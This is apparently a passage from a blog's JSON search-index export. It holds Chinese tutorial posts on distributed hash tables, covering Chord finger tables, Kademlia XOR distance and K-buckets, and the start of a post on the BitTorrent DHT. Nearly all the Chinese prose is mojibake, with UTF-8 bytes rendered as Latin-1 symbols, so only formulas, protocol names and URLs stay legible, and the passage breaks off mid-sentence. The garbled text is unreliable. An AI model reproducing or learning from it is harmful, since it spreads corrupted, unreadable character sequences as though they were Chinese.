çš„ç¯å½¢ç©ºé—´ä¸ºä¾‹ï¼š\n\tæ•°æ®åŒºé—´ [5,8] éš¶å±äºèŠ‚ç‚¹8\n\tæ•°æ®åŒºé—´ [9,15] éš¶å±äºèŠ‚ç‚¹15\n\t......\n\tæ•°æ®åŒºé—´ [59,4] éš¶å±äºèŠ‚ç‚¹4ï¼ˆæ³¨ï¼šâ€œ6æ¯”ç‰¹â€çš„ç¯å½¢ç©ºé—´ï¼Œ63ä¹‹åæ˜¯0ï¼‰\n\t```\n\n\n+ è·¯ç”±æœºåˆ¶\n\n\t- åŸºæœ¬è·¯ç”±ï¼ˆç®€å•éå†ï¼‰\n\n\t\tå½“æ”¶åˆ°è¯·æ±‚ï¼ˆkeyï¼‰ï¼Œå…ˆçœ‹ key æ˜¯å¦åœ¨è‡ªå·±è¿™é‡Œã€‚å¦‚æœåœ¨è‡ªå·±è¿™é‡Œï¼Œå°±ç›´æ¥è¿”å›ä¿¡æ¯ï¼›å¦åˆ™å°±æŠŠ key è½¬å‘ç»™è‡ªå·±çš„ç»§ä»»è€…ã€‚ä»¥æ­¤ç±»æ¨ã€‚\n\tã€€ã€€è¿™ç§ç©æ³•çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(N)ã€‚å¯¹äºä¸€ä¸ªèŠ‚ç‚¹æ•°å¾ˆå¤šçš„ DHT ç½‘ç»œï¼Œè¿™ç§åšæ³•æ˜¾ç„¶éå¸¸ä½æ•ˆã€‚\n\t\n\t- é«˜çº§è·¯ç”±ï¼ˆFinger Tableï¼‰\n\n\t\tâ€œFinger Tableâ€æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œæœ€å¤šåŒ…å« m é¡¹ï¼ˆm å°±æ˜¯æ•£åˆ—å€¼çš„æ¯”ç‰¹æ•°ï¼‰ï¼Œæ¯ä¸€é¡¹éƒ½æ˜¯èŠ‚ç‚¹ IDã€‚ æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸ªè·¯ç”±è¡¨\n\t\t\n\t\t\n\t\tå‡è®¾å½“å‰èŠ‚ç‚¹çš„ ID æ˜¯ nï¼Œé‚£ä¹ˆè¡¨ä¸­ç¬¬ i é¡¹çš„å€¼æ˜¯ï¼šsuccessor( (n + 2i) mod 2m ) å½“æ”¶åˆ°è¯·æ±‚ï¼ˆkeyï¼‰ï¼Œå°±åˆ°â€œFinger Tableâ€ä¸­æ‰¾åˆ°ã€æœ€å¤§çš„ä¸”ä¸è¶…è¿‡ keyã€‘çš„é‚£ä¸€é¡¹ï¼Œç„¶åæŠŠ key è½¬å‘ç»™è¿™ä¸€é¡¹å¯¹åº”çš„èŠ‚ç‚¹ã€‚æœ‰äº†â€œFinger Tableâ€ä¹‹åï¼Œæ—¶é—´å¤æ‚åº¦å¯ä»¥ä¼˜åŒ–ä¸º O(log N)ã€‚`è·³è·ƒå¼æŸ¥è¯¢`\n\t\t\n\n+ èŠ‚ç‚¹çš„åŠ å…¥\n\n\t- ä»»ä½•ä¸€ä¸ªæ–°æ¥çš„èŠ‚ç‚¹ï¼ˆå‡è®¾å« Aï¼‰ï¼Œéœ€è¦å…ˆè·Ÿ DHT ä¸­å·²æœ‰çš„ä»»ä¸€èŠ‚ç‚¹ï¼ˆå‡è®¾å« Bï¼‰å»ºç«‹è¿æ¥ã€‚\n\t- A éšæœºç”Ÿæˆä¸€ä¸ªæ•£åˆ—å€¼ä½œä¸ºè‡ªå·±çš„ IDï¼ˆå¯¹äºè¶³å¤Ÿå¤§çš„æ•£åˆ—å€¼ç©ºé—´ï¼ŒID ç›¸åŒçš„æ¦‚ç‡å¿½ç•¥ä¸è®¡ï¼‰\n\t- A é€šè¿‡è·Ÿ B è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰¾åˆ°è‡ªå·±è¿™ä¸ª ID åœ¨ç¯ä¸Šçš„æ¥å¤´äººã€‚ä¹Ÿå°±æ˜¯â€”â€”æ‰¾åˆ°è‡ªå·±è¿™ä¸ª ID å¯¹åº”çš„â€œç»§ä»»â€ï¼ˆå‡è®¾å« Cï¼‰ä¸â€œå‰ä»»â€ï¼ˆå‡è®¾å« Dï¼‰\n\t- ã€€æ¥ä¸‹æ¥ï¼ŒA éœ€è¦è·Ÿ C å’Œ D è¿›è¡Œä¸€ç³»åˆ—äº’åŠ¨ï¼Œä½¿å¾—è‡ªå·±æˆä¸º C çš„å‰ä»»ï¼Œä»¥åŠ D çš„ç»§ä»»ã€‚è¿™ä¸ªäº’åŠ¨è¿‡ç¨‹ï¼Œå¤§è‡´ç±»ä¼¼äºåœ¨åŒå‘é“¾è¡¨å½“ä¸­æ’å…¥å…ƒç´ \n\n+ èŠ‚ç‚¹çš„ã€æ­£å¸¸ã€‘é€€å‡º\n\n\t- å¦‚æœæŸä¸ªèŠ‚ç‚¹æƒ³è¦ä¸»åŠ¨ç¦»å¼€è¿™ä¸ª DHT ç½‘ç»œï¼ŒæŒ‰ç…§çº¦å®šéœ€è¦ä½œä¸€äº›å–„åçš„å¤„ç†å·¥ä½œã€‚æ¯”å¦‚è¯´ï¼Œé€šçŸ¥è‡ªå·±çš„å‰ä»»å»æ›´æ–°å…¶ç»§ä»»è€…......\nã€€ã€€è¿™äº›å–„åå¤„ç†ï¼Œå¤§è‡´ç±»ä¼¼äºåœ¨åŒå‘é“¾è¡¨ä¸­åˆ é™¤å…ƒç´ \n\n+ èŠ‚ç‚¹çš„ã€å¼‚å¸¸ã€‘é€€å‡º\n\n\t- ä½œä¸ºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿï¼Œä»»ä½•èŠ‚ç‚¹éƒ½æœ‰å¯èƒ½æ„å¤–ä¸‹çº¿ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæ¥ä¸åŠè¿›è¡Œå–„åå°±æŒ‚æ‰äº†ï¼‰\n\n\t\tå‡è®¾ èŠ‚ç‚¹A çš„ç»§ä»»è€…ã€å¼‚å¸¸ã€‘ä¸‹çº¿äº†ï¼Œé‚£ä¹ˆ èŠ‚ç‚¹A å°±æŠ“çäº†ã€‚å’‹åŠæï¼Ÿä¸ºäº†ä¿é™©èµ·è§ï¼ŒChord å¼•å…¥äº†ä¸€ä¸ªâ€œç»§ä»»è€…å€™é€‰åˆ—è¡¨â€çš„æ¦‚å¿µã€‚æ¯ä¸ªèŠ‚ç‚¹éƒ½ç”¨è¿™ä¸ªåˆ—è¡¨æ¥åŒ…å«ï¼šè·ç¦»è‡ªå·±æœ€è¿‘çš„ N ä¸ªèŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œé¡ºåºæ˜¯ã€ç”±è¿‘åˆ°è¿œã€‘ã€‚ä¸€æ—¦è‡ªå·±çš„ç»§ä»»è€…ä¸‹çº¿äº†ï¼Œå°±åœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°ä¸€ä¸ªã€è·ç¦»æœ€è¿‘ä¸”åœ¨çº¿ã€‘çš„èŠ‚ç‚¹ï¼Œä½œä¸ºæ–°çš„ç»§ä»»è€…ã€‚ç„¶å èŠ‚ç‚¹A æ›´æ–°è¯¥åˆ—è¡¨ï¼Œç¡®ä¿ä¾ç„¶æœ‰ N ä¸ªå€™é€‰ã€‚æ›´æ–°å®Œâ€œç»§ä»»è€…å€™é€‰åˆ—è¡¨â€åï¼ŒèŠ‚ç‚¹A ä¹Ÿä¼šé€šçŸ¥è‡ªå·±çš„å‰ä»»ï¼Œé‚£ä¹ˆ A çš„å‰ä»»ä¹Ÿå°±èƒ½æ›´æ–°è‡ªå·±çš„â€œç»§ä»»è€…å€™é€‰åˆ—è¡¨â€ã€‚\n\t\t\n\t\t\n### 4. Kademliaï¼ˆKadï¼‰åè®®\n\n\n+ æ‹“æ‰‘ç»“æ„â€”â€”äºŒå‰æ ‘\n\n\t- æ•£åˆ—å€¼çš„é¢„å¤„ç†\n\n\t\tKad ä¹Ÿé‡‡ç”¨äº†â€œnode ID ä¸ data key åŒæ„â€çš„è®¾è®¡æ€è·¯ã€‚ç„¶å Kad é‡‡ç”¨æŸç§ç®—æ³•æŠŠ key æ˜ å°„åˆ°ä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ¯ä¸€ä¸ª key éƒ½æ˜¯è¿™ä¸ªäºŒå‰æ ‘çš„ã€å¶å­ã€‘ã€‚åœ¨æ˜ å°„ä¹‹å‰ï¼Œå…ˆåšä¸€ä¸‹é¢„å¤„ç†ã€‚\n\t\t1. å…ˆæŠŠ key ä»¥äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºã€‚\n\t\t2. æŠŠæ¯ä¸€ä¸ª key ç¼©çŸ­ä¸ºå®ƒçš„ã€æœ€çŸ­å”¯ä¸€å‰ç¼€ã€‘ã€‚\n\n\t\n\t- æ•£åˆ—å€¼çš„æ˜ å°„\n\n\t\tå®Œæˆä¸Šè¿°çš„é¢„å¤„ç†åï¼Œæ¥ä¸‹æ¥çš„æ˜ å°„è§„åˆ™æ˜¯ï¼š\n\t\n\t\t1. å…ˆæŠŠ key ä»¥äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºï¼Œç„¶åä»é«˜ä½åˆ°ä½ä½ä¾æ¬¡å¤„ç†ã€‚\n\t\t2. äºŒè¿›åˆ¶çš„ç¬¬ n ä¸ªæ•°ä½å°±å¯¹åº”äº†äºŒå‰æ ‘çš„ç¬¬ n å±‚\n\t\t3. å¦‚æœè¯¥ä½æ˜¯1ï¼Œè¿›å…¥å·¦å­æ ‘ï¼Œæ˜¯0åˆ™è¿›å…¥å³å­æ ‘ï¼ˆè¿™åªæ˜¯äººä¸ºçº¦å®šï¼Œåè¿‡æ¥å¤„ç†ä¹Ÿå¯ä»¥ï¼‰\n\t\t4. å…¨éƒ¨æ•°ä½éƒ½å¤„ç†å®Œåï¼Œè¿™ä¸ª key å°±å¯¹åº”äº†äºŒå‰æ ‘ä¸Šçš„æŸä¸ªã€å¶å­ã€‘\n\n+ è·ç¦»ç®—æ³•â€”â€”å¼‚æˆ–ï¼ˆXORï¼‰\n\n\tæ¥ä¸‹æ¥è¦èŠçš„æ˜¯ Kad æœ€ç²¾å¦™ä¹‹å¤„â€”â€”é‡‡ç”¨ XORï¼ˆæŒ‰æ¯”ç‰¹å¼‚æˆ–æ“ä½œï¼‰ç®—æ³•è®¡ç®— key ä¹‹é—´çš„â€œè·ç¦»â€ã€‚è¿™ç§ææ³•ä½¿å¾—å®ƒå…·å¤‡äº†ç±»ä¼¼äºâ€œå‡ ä½•è·ç¦»â€çš„æŸäº›ç‰¹æ€§ï¼ˆä¸‹é¢ç”¨ âŠ• è¡¨ç¤º XORï¼‰\n\t\n\t```\n\t(A âŠ• B) == (B âŠ• A)\tXOR ç¬¦åˆâ€œäº¤æ¢å¾‹â€ï¼Œå…·å¤‡å¯¹ç§°æ€§ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒChord çš„è·ç¦»ç®—æ³•ä¸å¯¹ç§°\n\t(A âŠ• A) == 0\tåèº«æ€§ï¼Œè‡ªèº«è·ç¦»ä¸ºé›¶\n\t(A âŠ• B) > 0\tã€ä¸åŒã€‘çš„ä¸¤ä¸ª key ä¹‹é—´çš„è·ç¦»å¿…å¤§äºé›¶\n\t(A âŠ• B) + (B âŠ• C) >= (A âŠ• C)\tä¸‰è§’ä¸ç­‰å¼\n\t```\n\t\n+ è·¯ç”±æœºåˆ¶\n\n\t+ äºŒå‰æ ‘çš„æ‹†åˆ†\n\n\tå¯¹æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œéƒ½å¯ä»¥ã€æŒ‰ç…§è‡ªå·±çš„è§†è§’ã€‘å¯¹æ•´ä¸ªäºŒå‰æ ‘è¿›è¡Œæ‹†åˆ†ã€‚\n\t\n\tæ‹†åˆ†çš„è§„åˆ™æ˜¯ï¼šå…ˆä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼ŒæŠŠã€ä¸åŒ…å«ã€‘è‡ªå·±çš„é‚£ä¸ªå­æ ‘æ‹†åˆ†å‡ºæ¥ï¼›ç„¶ååœ¨å‰©ä¸‹çš„å­æ ‘å†æ‹†åˆ†ä¸åŒ…å«è‡ªå·±çš„ä¸‹ä¸€å±‚å­æ ‘ï¼›ä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æœ€ååªå‰©ä¸‹è‡ªå·±ã€‚\n\t\n\tKad é»˜è®¤çš„æ•£åˆ—å€¼ç©ºé—´æ˜¯ m=160ï¼ˆæ•£åˆ—å€¼æœ‰ 160 æ¯”ç‰¹ï¼‰ï¼Œå› æ­¤æ‹†åˆ†å‡ºæ¥çš„å­æ ‘ã€æœ€å¤šã€‘æœ‰ 160 ä¸ªï¼ˆè€ƒè™‘åˆ°å®é™…çš„èŠ‚ç‚¹æ•°ã€è¿œè¿œå°äºã€‘2160ï¼Œå­æ ‘çš„ä¸ªæ•°ä¼šæ˜æ˜¾å°äº 160ï¼‰ã€‚\n\t\n\tå¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹è€Œè¨€ï¼Œå½“å®ƒä»¥è‡ªå·±çš„è§†è§’å®Œæˆå­æ ‘æ‹†åˆ†åï¼Œä¼šå¾—åˆ° n ä¸ªå­æ ‘ï¼›å¯¹äºæ¯ä¸ªå­æ ‘ï¼Œå¦‚æœå®ƒéƒ½èƒ½çŸ¥é“é‡Œé¢çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥åˆ©ç”¨è¿™ n ä¸ªèŠ‚ç‚¹è¿›è¡Œé€’å½’è·¯ç”±ï¼Œä»è€Œåˆ°è¾¾æ•´ä¸ªäºŒå‰æ ‘çš„ã€ä»»ä½•ä¸€ä¸ªã€‘èŠ‚ç‚¹\n\t\n+ K-æ¡¶ï¼ˆK-bucketï¼‰ \n\n\tæ¯ä¸ªèŠ‚ç‚¹åœ¨å®Œæˆå­æ ‘æ‹†åˆ†åï¼Œåªéœ€è¦çŸ¥é“æ¯ä¸ªå­æ ‘é‡Œé¢çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±è¶³ä»¥å®ç°å…¨éå†ã€‚ä½†æ˜¯è€ƒè™‘åˆ°å¥å£®æ€§ï¼ˆè¯·å§‹ç»ˆç‰¢è®°ï¼šåˆ†å¸ƒå¼ç³»ç»Ÿçš„èŠ‚ç‚¹æ˜¯åŠ¨æ€å˜åŒ–æ»´ï¼‰ï¼Œå…‰çŸ¥é“ã€ä¸€ä¸ªã€‘æ˜¾ç„¶æ˜¯ä¸å¤Ÿæ»´ï¼Œéœ€è¦çŸ¥é“ã€å¤šä¸ªã€‘æ‰æ¯”è¾ƒä¿é™©ã€‚\n\t\n\tæ‰€ä»¥ Kad è®ºæ–‡ä¸­ç»™å‡ºäº†ä¸€ä¸ªâ€œK-æ¡¶ï¼ˆK-bucketï¼‰â€çš„æ¦‚å¿µã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šæ¯ä¸ªèŠ‚ç‚¹åœ¨å®Œæˆå­æ ‘æ‹†åˆ†åï¼Œè¦è®°å½•æ¯ä¸ªå­æ ‘é‡Œé¢çš„ K ä¸ªèŠ‚ç‚¹ã€‚è¿™é‡Œæ‰€è¯´çš„ K å€¼æ˜¯ä¸€ä¸ªã€ç³»ç»Ÿçº§ã€‘çš„å¸¸é‡ã€‚ç”±ä½¿ç”¨ Kad çš„è½¯ä»¶ç³»ç»Ÿè‡ªå·±è®¾å®šï¼ˆæ¯”å¦‚ BT ä¸‹è½½ä½¿ç”¨çš„ Kad ç½‘ç»œï¼ŒK è®¾å®šä¸º 8ï¼‰ã€‚\n\t\n\tK æ¡¶å…¶å®å°±æ˜¯ã€è·¯ç”±è¡¨ã€‘ã€‚å¯¹äºæŸä¸ªèŠ‚ç‚¹è€Œè¨€ï¼Œå¦‚æœã€ä»¥å®ƒè‡ªå·±ä¸ºè§†è§’ã€‘æ‹†åˆ†äº† n ä¸ªå­æ ‘ï¼Œé‚£ä¹ˆå®ƒå°±éœ€è¦ç»´æŠ¤ n ä¸ªè·¯ç”±è¡¨ï¼Œå¹¶ä¸”æ¯ä¸ªè·¯ç”±è¡¨çš„ã€ä¸Šé™ã€‘æ˜¯ Kã€‚è¯´ K åªæ˜¯ä¸€ä¸ªã€ä¸Šé™ã€‘ï¼Œæ˜¯å› ä¸ºæœ‰ä¸¤ç§æƒ…å†µä½¿å¾— K æ¡¶çš„å°ºå¯¸ä¼šå°äº Kã€‚\n\t1. è·ç¦»è¶Šè¿‘çš„å­æ ‘å°±è¶Šå°ã€‚å¦‚æœæ•´ä¸ªå­æ ‘ã€å¯èƒ½å­˜åœ¨çš„ã€‘èŠ‚ç‚¹æ•°å°äº Kï¼Œé‚£ä¹ˆè¯¥å­æ ‘çš„ K æ¡¶å°ºå¯¸æ°¸è¿œä¹Ÿä¸å¯èƒ½è¾¾åˆ° Kã€‚\n\t2. æœ‰äº›å­æ ‘è™½ç„¶å®é™…ä¸Šçº¿çš„èŠ‚ç‚¹æ•°è¶…è¿‡ Kï¼Œä½†æ˜¯å› ä¸ºç§ç§åŸå› ï¼Œæ²¡æœ‰æ”¶é›†åˆ°è¯¥å­æ ‘è¶³å¤Ÿå¤šçš„èŠ‚ç‚¹ï¼Œè¿™ä¹Ÿä¼šä½¿å¾—è¯¥å­æ ‘çš„ K æ¡¶å°ºå¯¸å°äº Kã€‚\n\t\n+ K-æ¡¶ï¼ˆK-bucketï¼‰çš„åˆ·æ–°æœºåˆ¶\n\n\t+ `ä¸»åŠ¨æ”¶é›†èŠ‚ç‚¹`ã€€\t\tã€€\n\t\t\n\t\tä»»ä½•èŠ‚ç‚¹éƒ½å¯ä»¥ä¸»åŠ¨å‘èµ·â€œæŸ¥è¯¢èŠ‚ç‚¹â€çš„è¯·æ±‚ï¼ˆå¯¹åº”äºåè®®ç±»å‹ FIND_NODEï¼‰ï¼Œä»è€Œåˆ·æ–° K æ¡¶ä¸­çš„èŠ‚ç‚¹ä¿¡æ¯\n\t\t\n\t+ `è¢«åŠ¨æ”¶é›†èŠ‚ç‚¹`\n\n\t\tå¦‚æœæ”¶åˆ°å…¶å®ƒèŠ‚ç‚¹å‘æ¥çš„è¯·æ±‚ï¼ˆåè®®ç±»å‹ FIND_NODE æˆ– FIND_VALUEï¼‰ï¼Œä¼šæŠŠå¯¹æ–¹çš„ ID åŠ å…¥è‡ªå·±çš„æŸä¸ª K æ¡¶ä¸­ã€‚ \n\t\t\n\t+ `æ¢æµ‹å¤±æ•ˆèŠ‚ç‚¹`\n\t\n\t\tKad è¿˜æ˜¯æ”¯æŒä¸€ç§æ¢æµ‹æœºåˆ¶ï¼ˆåè®®ç±»å‹ PINGï¼‰ï¼Œå¯ä»¥åˆ¤æ–­æŸä¸ª ID çš„èŠ‚ç‚¹æ˜¯å¦åœ¨çº¿ã€‚å› æ­¤å°±å¯ä»¥å®šæœŸæ¢æµ‹è·¯ç”±è¡¨ä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç„¶åæŠŠä¸‹çº¿çš„èŠ‚ç‚¹ä»è·¯ç”±è¡¨ä¸­å¹²æ‰ã€‚\n\n\n+ â€œå¹¶å‘è¯·æ±‚â€ä¸â€œÎ± å‚æ•°â€\n\n\tâ€œKæ¡¶â€çš„è¿™ä¸ªè®¾è®¡æ€è·¯ã€å¤©ç”Ÿæ”¯æŒå¹¶å‘ã€‘ã€‚å› ä¸ºã€åŒä¸€ä¸ªã€‘â€œKæ¡¶â€ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯å¹³ç­‰çš„ï¼Œæ²¡æœ‰å“ªä¸ªæ›´ç‰¹æ®Šï¼›è€Œä¸”å¯¹ã€åŒä¸€ä¸ªã€‘â€œKæ¡¶â€ä¸­çš„èŠ‚ç‚¹å‘èµ·è¯·æ±‚ï¼Œäº’ç›¸ä¹‹é—´æ²¡æœ‰å½±å“ï¼ˆæ— è€¦åˆï¼‰ã€‚\n\t\n\tæ‰€ä»¥ Kad åè®®è¿˜å¼•å…¥äº†ä¸€ä¸ªâ€œÎ± å‚æ•°â€ï¼Œé»˜è®¤è®¾ç½®ä¸º 3ï¼Œä½¿ç”¨ Kad çš„è½¯ä»¶å¯ä»¥åœ¨å…·ä½“ä½¿ç”¨åœºæ™¯ä¸­è°ƒæ•´è¿™ä¸ª Î± å› å­ã€‚\n\t\n\tå½“éœ€è¦è·¯ç”±åˆ°æŸä¸ªâ€œå­æ ‘â€ï¼Œä¼šä»è¯¥å­æ ‘å¯¹åº”çš„â€œKæ¡¶â€ä¸­æŒ‘é€‰ã€Î± ä¸ªèŠ‚ç‚¹ã€‘ï¼Œç„¶åå¯¹è¿™å‡ ä¸ªèŠ‚ç‚¹ã€åŒæ—¶ã€‘å‘å‡ºè¯·æ±‚ã€‚è¿™ä¹ˆåšæœ‰å•¥å¥½å¤„æï¼Ÿä¿ºåœ¨æœ¬æ–‡æœ«å°¾èŠâ€œæ€§èƒ½â€å’Œâ€œå®‰å…¨æ€§â€æ—¶ä¼šå…·ä½“ä»‹ç»ã€‚\n\t\n+ èŠ‚ç‚¹çš„åŠ å…¥\n\t\n\t- ä»»ä½•ä¸€ä¸ªæ–°æ¥çš„èŠ‚ç‚¹ï¼ˆå‡è®¾å« Aï¼‰ï¼Œéœ€è¦å…ˆè·Ÿ DHT ä¸­å·²æœ‰çš„ä»»ä¸€èŠ‚ç‚¹ï¼ˆå‡è®¾å« Bï¼‰å»ºç«‹è¿æ¥ã€‚\n\t- A éšæœºç”Ÿæˆä¸€ä¸ªæ•£åˆ—å€¼ä½œä¸ºè‡ªå·±çš„ IDï¼ˆå¯¹äºè¶³å¤Ÿå¤§çš„æ•£åˆ—å€¼ç©ºé—´ï¼ŒID ç›¸åŒçš„æ¦‚ç‡å¿½ç•¥ä¸è®¡ï¼‰\n\t- A å‘ B å‘èµ·ä¸€ä¸ªæŸ¥è¯¢è¯·æ±‚ï¼ˆåè®®ç±»å‹ FIND_NODEï¼‰ï¼Œè¯·æ±‚çš„ ID æ˜¯è‡ªå·±ï¼ˆé€šä¿—åœ°è¯´ï¼Œå°±æ˜¯æŸ¥è¯¢è‡ªå·±ï¼‰\n\t- B æ”¶åˆ°è¯¥è¯·æ±‚ä¹‹åï¼Œï¼ˆå¦‚å‰é¢æ‰€è¯´ï¼‰ä¼šå…ˆæŠŠ A çš„ ID åŠ å…¥è‡ªå·±çš„æŸä¸ª K æ¡¶ä¸­ã€‚ç„¶åï¼Œæ ¹æ® FIND_NODE åè®®çš„çº¦å®šï¼ŒB ä¼šæ‰¾åˆ°ã€Kä¸ªã€‘æœ€æ¥è¿‘ A çš„èŠ‚ç‚¹ï¼Œå¹¶è¿”å›ç»™ Aã€‚ï¼ˆB æ€ä¹ˆçŸ¥é“å“ªäº›èŠ‚ç‚¹æ¥è¿‘ A æï¼Ÿè¿™æ—¶å€™ï¼Œã€ç”¨ XOR è¡¨ç¤ºè·ç¦»ã€‘çš„ç®—æ³•å°±å‘æŒ¥ä½œç”¨å•¦ï¼‰\n\t- A æ”¶åˆ°è¿™ K ä¸ªèŠ‚ç‚¹çš„ ID ä¹‹åï¼Œï¼ˆä»…ä»…æ ¹æ®è¿™æ‰¹ ID çš„å€¼ï¼‰å°±å¯ä»¥å¼€å§‹åˆå§‹åŒ–è‡ªå·±çš„ K æ¡¶ã€‚\n\t- ç„¶å A ä¼šç»§ç»­å‘åˆšåˆšæ‹¿åˆ°çš„è¿™æ‰¹èŠ‚ç‚¹å‘é€æŸ¥è¯¢è¯·æ±‚ï¼ˆåè®®ç±»å‹ FIND_NODEï¼‰ï¼Œå¦‚æ­¤å¾€å¤ï¼ˆé€’å½’ï¼‰ï¼Œç›´è‡³ A å»ºç«‹äº†è¶³å¤Ÿè¯¦ç»†çš„è·¯ç”±è¡¨ã€‚\n\n+ èŠ‚ç‚¹çš„é€€å‡º\n\t\n\tä¸ Chord ä¸åŒï¼ŒKad å¯¹äºèŠ‚ç‚¹é€€å‡ºæ²¡æœ‰é¢å¤–çš„è¦æ±‚ï¼ˆæ²¡æœ‰â€œä¸»åŠ¨é€€å‡ºâ€çš„è¯´æ³•ï¼‰ã€‚\nã€€ã€€æ‰€ä»¥ï¼ŒKad çš„èŠ‚ç‚¹æƒ³ç¦»å¼€ DHT ç½‘ç»œä¸éœ€è¦ä»»ä½•æ“ä½œï¼ˆå¥—ç”¨å¾å¿—æ‘©çš„åè¨€ï¼šæ‚„æ‚„çš„æˆ‘èµ°äº†ï¼Œæ­£å¦‚æˆ‘æ‚„æ‚„çš„æ¥ï¼‰\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ https://colobu.com/2018/03/26/distributed-hash-table/\n+ https://program-think.blogspot.com/2017/09/Introduction-DHT-Kademlia-Chord.html\n\n","tags":["dht"],"categories":["bittorrent"]},{"title":"Kademlia_DHT_KRPC_BitTorrentåè®®(äºŒ)","url":"%2Fp%2F8dc4df20.html","content":"\n\n# 4. BitTorrentåè®®\n\nBitTorrent ä½¿ç”¨\"åˆ†å¸ƒå¼å“ˆå¸Œè¡¨\"(DHT)æ¥ä¸ºæ—  tracker çš„ç§å­(torrents)å­˜å‚¨ peer ä¹‹é—´çš„è”ç³»ä¿¡æ¯ã€‚è¿™æ ·æ¯ä¸ª peer éƒ½æˆäº† trackerã€‚è¿™ä¸ªåè®®åŸºäº Kademila ç½‘ç»œå¹¶ä¸”åœ¨ UDP ä¸Šå®ç°ã€‚\n\n<!-- more -->\n\n\n```\n1. \"peer\" æ˜¯åœ¨ä¸€ä¸ª TCP ç«¯å£ä¸Šç›‘å¬çš„å®¢æˆ·ç«¯/æœåŠ¡å™¨ï¼Œå®ƒå®ç°äº† BitTorrent åè®® \n2. \"èŠ‚ç‚¹\" æ˜¯åœ¨ä¸€ä¸ª UDP ç«¯å£ä¸Šç›‘å¬çš„å®¢æˆ·ç«¯/æœåŠ¡å™¨ï¼Œå®ƒå®ç°äº† DHT(åˆ†å¸ƒå¼å“ˆå¸Œè¡¨) åè®® \nDHT ç”±èŠ‚ç‚¹ç»„æˆï¼Œå®ƒå­˜å‚¨äº† peer çš„ä½ç½®ã€‚BitTorrent å®¢æˆ·ç«¯åŒ…å«ä¸€ä¸ª DHT èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è”ç³» DHT ä¸­å…¶ä»–èŠ‚ç‚¹ï¼Œä»è€Œå¾—åˆ° peer çš„ä½ç½®ï¼Œè¿›è€Œé€šè¿‡ BitTorrent åè®®ä¸‹è½½ \n```\n\n\næ¯ä¸ªèŠ‚ç‚¹æœ‰ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œä½œä¸º \"node ID\"ã€‚èŠ‚ç‚¹ ID æ˜¯ä¸€ä¸ªéšæœºé€‰æ‹©çš„ 160bit(20å­—èŠ‚) ç©ºé—´ï¼ŒBitTorrent infohash ä¹Ÿä½¿ç”¨è¿™æ ·çš„ 160bit ç©ºé—´ã€‚\"è·ç¦»\"ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªèŠ‚ç‚¹ ID ä¹‹é—´æˆ–è€…èŠ‚ç‚¹ ID å’Œ infohash ä¹‹é—´çš„\"è¿œè¿‘\"(èŠ‚ç‚¹å’ŒèŠ‚ç‚¹ã€èŠ‚ç‚¹å’Œæ–‡ä»¶ä¹‹é—´çš„è·ç¦»)ã€‚èŠ‚ç‚¹å¿…é¡»ç»´æŠ¤ä¸€ä¸ªè·¯ç”±è¡¨ï¼Œè·¯ç”±è¡¨ä¸­å«æœ‰ä¸€éƒ¨åˆ†å…¶å®ƒèŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯ã€‚å…¶å®ƒèŠ‚ç‚¹è·ç¦»è‡ªå·±è¶Šè¿‘æ—¶ï¼Œè·¯ç”±è¡¨ä¿¡æ¯è¶Šè¯¦ç»†ã€‚å› æ­¤æ¯ä¸ªèŠ‚ç‚¹éƒ½çŸ¥é“ DHT ä¸­ç¦»è‡ªå·±å¾ˆ\"è¿‘\"çš„èŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯ï¼Œè€Œç¦»è‡ªå·±éå¸¸è¿œçš„ ID çš„è”ç³»ä¿¡æ¯å´çŸ¥é“çš„å¾ˆå°‘ \nåœ¨ Kademlia ç½‘ç»œä¸­ï¼Œè·ç¦»æ˜¯é€šè¿‡å¼‚æˆ–(XOR)è®¡ç®—çš„ï¼Œç»“æœä¸ºæ— ç¬¦å·æ•´æ•°ã€‚distance(A, B) = |A xor B|ï¼Œå€¼è¶Šå°è¡¨ç¤ºè¶Šè¿‘\n\n\n\n1. å½“èŠ‚ç‚¹è¦ä¸º torrent(ç§å­æ–‡ä»¶) å¯»æ‰¾ peer(ä¿å­˜äº†ç›®æ ‡èµ„æºçš„IP) æ—¶ï¼Œå®ƒå°†è‡ªå·±è·¯ç”±è¡¨ä¸­çš„èŠ‚ç‚¹ ID å’Œ torrent çš„ infohash(èµ„æºHASH) è¿›è¡Œ\"è·ç¦»å¯¹æ¯”\"(èŠ‚ç‚¹å’Œç›®æ ‡æ–‡ä»¶çš„è·ç¦»)ï¼Œç„¶åå‘è·¯ç”±è¡¨ä¸­ç¦» infohash æœ€è¿‘çš„èŠ‚ç‚¹å‘é€è¯·æ±‚ï¼Œé—®å®ƒä»¬æ­£åœ¨ä¸‹è½½è¿™ä¸ª torrent çš„ peer çš„è”ç³»ä¿¡æ¯\n\n2. å› 